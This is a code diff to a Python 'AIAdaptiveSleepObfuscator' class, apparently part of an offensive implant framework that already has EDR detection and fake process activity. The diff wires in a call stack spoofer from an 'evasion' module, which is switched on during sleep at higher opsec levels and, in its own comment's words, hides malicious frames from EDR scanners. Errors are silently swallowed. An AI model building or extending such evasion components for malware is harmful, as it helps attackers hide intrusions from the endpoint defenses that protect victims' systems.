@@ -48,6 +48,13 @@ try:
 except ImportError:
     HAS_CRYPTO = False
 
+try:
+    from evasion.call_stack_spoofing import CallStackSpoofer
+    HAS_STACK_SPOOF = True
+except ImportError:
+    HAS_STACK_SPOOF = False
+    CallStackSpoofer = None
+
 
 # =============================================================================
 # ENUMS & DATA CLASSES
@@ -224,6 +231,9 @@ class AIAdaptiveSleepObfuscator:
         
         # Session ID (for tracking)
         self.session_id = f"sleep_{int(time.time() * 1000)}"
+        
+        # Call stack spoofer
+        self._stack_spoofer = CallStackSpoofer() if HAS_STACK_SPOOF else None
         
         # Auto-detect EDR if enabled
         if auto_detect_edr:
@@ -805,6 +815,13 @@ class AIAdaptiveSleepObfuscator:
         if self.opsec_level >= 2:
             self._generate_fake_process_activity()
         
+        # Call stack spoofing (hide malicious frames from EDR scanners)
+        if self.opsec_level >= 3 and self._stack_spoofer:
+            try:
+                self._stack_spoofer.enable()
+            except Exception:
+                pass
+        
         # Encrypt sensitive data if provided
         encrypted_data = None
         encryption_key = None
@@ -848,6 +865,13 @@ class AIAdaptiveSleepObfuscator:
                     callback()
                 except Exception:
                     pass
+        
+        # Disable call stack spoofing after sleep
+        if self.opsec_level >= 3 and self._stack_spoofer:
+            try:
+                self._stack_spoofer.disable()
+            except Exception:
+                pass
         
         # Post-sleep OPSEC
         if self.opsec_level >= 3:
